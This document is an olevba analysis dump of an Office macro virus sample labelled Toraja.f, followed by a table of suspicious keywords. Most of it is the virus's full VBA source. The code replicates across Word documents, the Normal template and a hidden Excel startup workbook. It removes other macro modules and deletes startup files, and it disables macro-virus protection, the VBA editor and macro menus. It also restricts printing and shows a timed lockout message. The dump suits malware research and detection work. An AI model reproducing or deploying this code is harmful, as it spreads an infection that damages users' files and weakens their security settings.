olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Toraja.f-8cfd96d709822881e5d0421e056e2daa41a6d113
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Toraja.f-8cfd96d709822881e5d0421e056e2daa41a6d113 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforePrint(Cancel As Boolean)
On Error Resume Next
If PrintOke = False Then
    Serang
    Cancel = True
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Toraja.f-8cfd96d709822881e5d0421e056e2daa41a6d113 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toraja12.bas 
in file: Virus.MSOffice.Toraja.f-8cfd96d709822881e5d0421e056e2daa41a6d113 - OLE stream: '_VBA_PROJECT_CUR/VBA/Toraja12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






'Created       : Toraja High Land 1998 by Marsel - Lina
'Modified       : July 1999
'--------------------------------------------------------------
Option Explicit
Option Compare Text
Dim Komp As Variant
Public Const regApp As String = "Application"
Public Const regSecSet As String = "Settings"
Public Const regSecApp As String = "AppName"
Const TempVer As String = "Tana"
Const MacName As String = "Toraja"
Const Ver As String = "12"
Dim ctl As Variant
Global blnFound As Boolean
Dim CusProp
Dim blnMod As Boolean
Public Const TimerOn = "01:00:00"
Const Akhir = 80
Dim Caption As String
Dim actWindow
Global Active
Global Temp
Global TempPath
Dim Waktu
Dim Bar As Integer
Sub Register()
Attribute Register.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next


If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
Function Serang() As Boolean
Attribute Serang.VB_ProcData.VB_Invoke_Func = " \n14"
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If getDate <= Date Then ShowMe
End Function
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.EnableCancelKey = 0
        Application.DisplayRecentFiles = False
        SaveSetting regApp, regSecApp, "Microsoft Word", "True"
        MenuWord
        ExportXls
        Register
        Documents.Add
        Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub
Sub AutoNew()
Attribute AutoNew.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Dim strRun As String
        Application.EnableCancelKey = 0
        If PWords = False Then Application.ShowVisualBasicEditor = False
        ActiveTemp
        RemoveAll
        MenuWord
        Register
        If blnFound = True Then
            strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
            Application.OnTime Now + TimeValue("00:01:00"), strRun
       End If
End Sub
Function KeyWord() As Boolean
Attribute KeyWord.VB_ProcData.VB_Invoke_Func = " \n14"
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function
Sub FileOpen()
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
    WordBasic.DisableAutoMacros 1
    Dialogs(80).Show
    TempActive
    WordBasic.DisableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan) As Boolean
Attribute KompProject.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
      If Komp.Name = MacName & Ver Then blnMod = True
      If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And (Komp.Name <> MacName & Ver) And _
          (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
            Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
            KompProject = True
            End If
            Next Komp
      If blnMod = False Then
        If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
    End If
Salah:
End Function
Sub RemoveAll()
Attribute RemoveAll.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Set ctl = Documents
For Each ctl In Documents
    If ctl <> ActiveDocument Then
        KompProject ActiveDocument, ctl
        If Len(ctl.Path) <> 0 Then ctl.Save
    End If
Next ctl
End Sub
Function PrintOke() As Boolean
Attribute PrintOke.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
If KeyWord = True Or GetCreator = True Then
    PrintOke = True
Else
    If CusProp.Item("CountPrint").Value < 5 Then
        CusProp.Item("CountPrint").Value = CusProp.Item("CountPrint").Value + 1
        If Val(GetSetting(regApp, regSecSet, "CountPrt")) <= 250 Then
            SaveSetting regApp, regSecSet, "CountPrt", Val(GetSetting(regApp, regSecSet, "CountPrt")) + 1
            PrintOke = True
        End If
    End If
End If
Salah:
End Function
Sub FilePrint()
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If PrintOke = True Then
    Dialogs(88).Show
Else
    Dialogs(88).Display
    Serang
End If
End Sub
Sub FilePrintDefault()
Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = " \n14"
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Attribute ToolsCustomizeKeyboard.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Sub ViewCode()
Attribute ViewCode.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Sub ViewVBcode()
Attribute ViewVBcode.VB_ProcData.VB_Invoke_Func = " \n14"
If PWords = True Then ShowVisualBasicEditor = True Else Serang
End Sub
Sub ToolsCustomize()
Attribute ToolsCustomize.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Sub FormatStyle()
Attribute FormatStyle.VB_ProcData.VB_Invoke_Func = " \n14"
If KeyWord = True Then Dialogs(180).Show Else Serang
End Sub
Sub ToolsRecordMacroToggle()
Attribute ToolsRecordMacroToggle.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = " \n14"
Serang
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
If (GetSetting(regApp, regSecApp, "Microsoft Excel") <> "True") Then
On Error GoTo Salah:
    Set xlsApp = CreateObject("Excel.Application")
   xlsApp.Workbooks.Add
    strFile = xlsApp.StartupPath & xlsApp.PathSeparator & "START" & Ver & ".XLS"
    xlsApp.ActiveWorkbook.SaveAs strFile
    TempPath = Application.NormalTemplate.Path & Application.PathSeparator
    EIKModul NormalTemplate, xlsApp.Workbooks("START" & Ver & ".XLS"), MacName & Ver
    xlsApp.Workbooks("START" & Ver & ".XLS").VBProject.Name = TempVer & Ver
    xlsApp.ActiveWindow.Visible = False
    xlsApp.Workbooks("START" & Ver & ".XLS").Save
    xlsApp.Application.Quit
    SaveSetting regApp, regSecApp, "Microsoft Excel", "True"
End If
Salah:
End Sub
Sub ExportDok()
Attribute ExportDok.VB_ProcData.VB_Invoke_Func = " \n14"
Dim dokApp
If (GetSetting(regApp, regSecApp, "Microsoft Word") <> "True") Then
    On Error GoTo Salah
    Set dokApp = CreateObject("Word.Application")
    TempPath = Application.TemplatePath
     KompProject Workbooks("START" & Ver & ".XLS"), dokApp.NormalTemplate
    dokApp.Application.Quit True
    SaveSetting regApp, regSecApp, "Microsoft Word", "True"
End If
Salah:
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableCancelKey = 0
XlsActive
ExportDok
Application.DisplayRecentFiles = False
End Sub
Private Sub AllWorkBook()
blnMod = False
For Each Komp In Workbooks
      actWindow = Komp.Name
      If actWindow = "START" & Ver & ".XLS" Then blnMod = True
      If Komp.Path = Application.StartupPath And actWindow <> "START" & Ver & ".XLS" Then
               Komp.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next Komp
If blnMod = False Then BuatXlsActive
End Sub
Sub XlsActive()
Attribute XlsActive.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = False
CreateEvents
TempActive
AllWorkBook
Application.OnSheetActivate = ""
Application.OnSheetDeactivate = ""
Application.OnWindow = ""
MenuExcel
Application.OnWindow = "START" & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub
Sub TempActive()
Attribute TempActive.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Aplikasi
 If KompProject(Temp, Active) = True Then
       SetCusProp
       Active.VBProject.Name = MacName
       If Len(Active.Path) <> 0 Then Active.Save
    End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
Attribute EIKModul.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
    Asal.VBProject.VBComponents(Komp).Export TempPath & Komp
    Tujuan.VBProject.VBComponents.Import TempPath & Komp
    EIKModul = True
    Kill TempPath & Komp
Salah:
End Function
Sub OpenFile()
Attribute OpenFile.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim vbComp
On Error GoTo Salah
lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> "START" & Ver & ".XLS" Then
On Error GoTo FatalError
    Set vbComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With vbComp
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            .InsertLines 2, "On Error Resume Next"
            .InsertLines 3, "If PrintOke = False Then"
            .InsertLines 4, "    Serang"
            .InsertLines 5, "    Cancel = True"
            .InsertLines 6, "End if"
            .InsertLines 7, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
Salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume lanjut
End Sub
Sub BuatXlsActive()
Attribute BuatXlsActive.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & "START" & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
Attribute ActiveTemp.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Aplikasi
If KompProject(Active, Temp) = True Then
       Temp.VBProject.Name = TempVer & Ver
       Temp.Save
       SaveSetting regApp, regSecApp, Application.Name, "True"
       blnFound = True
    End If
End Sub
Sub MenuExcel()
Attribute MenuExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
    For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
              ctl.OnAction = "Serang"
    Next ctl
    WordExcel
    CommandBars("Ply").Controls("View Code").Delete
    With Application
            .OnKey "%{F11}", "Serang"
            .OnKey "%{F8}", "Serang"
            .OnKey "%{F2}", "Serang"
            .OnKey "%{F4}", "Serang"
            .OnKey "{F12}", "Serang"
            .OnKey "^{o}", "OpenFile"
    End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
End Sub
Sub WordExcel()
Attribute WordExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars.ActiveMenuBar, False
cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
Attribute cmdBars.VB_ProcData.VB_Invoke_Func = " \n14"
With cmd
    If blnVis = True Then
        .Enabled = False
        .Visible = False
        .Protection = 8
    End If
        .Protection = 1
End With
End Sub
Sub MenuWord()
Attribute MenuWord.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
CustomizationContext = NormalTemplate
  With Options
            .VirusProtection = False
            .SaveNormalPrompt = False
    End With
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
    WordExcel
End Sub
Sub SetCusProp()
Attribute SetCusProp.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, ""
CusProp.Add "CountPrint", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
Attribute GetCreator.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
        Aplikasi
        Set CusProp = Active.CustomDocumentProperties
        If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
Salah:
End Function
Function PWords() As Boolean
Attribute PWords.VB_ProcData.VB_Invoke_Func = " \n14"
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then PWords = True
End Function
Sub OnTimer()
Attribute OnTimer.VB_ProcData.VB_Invoke_Func = " \n14"
    Serang
    Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub
Sub FoundIt()
Attribute FoundIt.VB_ProcData.VB_Invoke_Func = " \n14"
TempActive
blnFound = False
End Sub
Sub Pesan(strPesan As String, Msg)
Attribute Pesan.VB_ProcData.VB_Invoke_Func = " \n14"
Dim A  As String
Dim B(3)
Dim x, i, j
Dim K
B(0) = "  \": B(1) = "  -  ": B(2) = "  /": B(3) = "  |"
i = 0
If Bar = 0 Then K = "Toraja High Land: " Else K = "Note ... each file can be printed 5 times only: "
    A = "                                                                                                                                          " & strPesan
    For x = 1 To Len(A)
       Msg.Caption = A & B(i)
       Application.StatusBar = K & Akhir - Int(Timer - Waktu) & " sec " & B(i)
       A = Right$(A, Len(A) - 1)
        i = i + 1
        For j = 1 To 150000: Next
        If (Timer - Waktu >= Akhir) Or Timer - Waktu < 0 Then GoTo done
        If i = 4 Then i = 0
    Next
done:
If Bar = 0 Then Bar = 1 Else Bar = 0
Msg.Caption = ""
End Sub
Sub Message(Msg)
Attribute Message.VB_ProcData.VB_Invoke_Func = " \n14"
Dim strPesan() As String

Select Case Month(Date)
    Case 11, 12: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) & strPesan(4) & strPesan(2) + 1 & "]"
    Case 1: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) - 1 & strPesan(4) & strPesan(2) & "]"
End Select
Application.DisplayStatusBar = True
Waktu = Timer
Do While (Timer - Waktu <= Akhir) And Timer - Waktu >= 0
    Pesan strPesan(0), Msg
    Pesan strPesan(1), Msg
    Pesan strPesan(5), Msg
Loop
End Sub
Function Tator() As Boolean
Attribute Tator.VB_ProcData.VB_Invoke_Func = " \n14"
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function
Sub ShowMe()
Attribute ShowMe.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Maks, Min As Integer
On Error Resume Next
If Tator = True Then
Application.EnableCancelKey = 0
Caption = ActiveWindow.Caption
    If Application.Name = "Microsoft Word" Then
        Maks = 1
        Application.Caption = " "
        If Windows.Count > 0 Then Set actWindow = ActiveWindow Else Set actWindow = Application
    Else
        Set actWindow = Application
        ActiveWindow.Caption = ""
        Maks = -4137
    End If
    Application.WindowState = Maks
    actWindow.WindowState = Maks
    Message actWindow
    Application.StatusBar = ""
    ActiveWindow.Caption = Caption
    Application.Caption = ""
End If
End Sub
Sub Aplikasi()
Attribute Aplikasi.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
Attribute Doc.VB_ProcData.VB_Invoke_Func = " \n14"
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Active = ActiveDocument
Set Temp = NormalTemplate
End Sub
Sub Xls()
Attribute Xls.VB_ProcData.VB_Invoke_Func = " \n14"
Set Active = ActiveWorkbook
Set Temp = Workbooks("START" & Ver & ".XLS")
TempPath = Application.TemplatesPath
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - °sÑ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

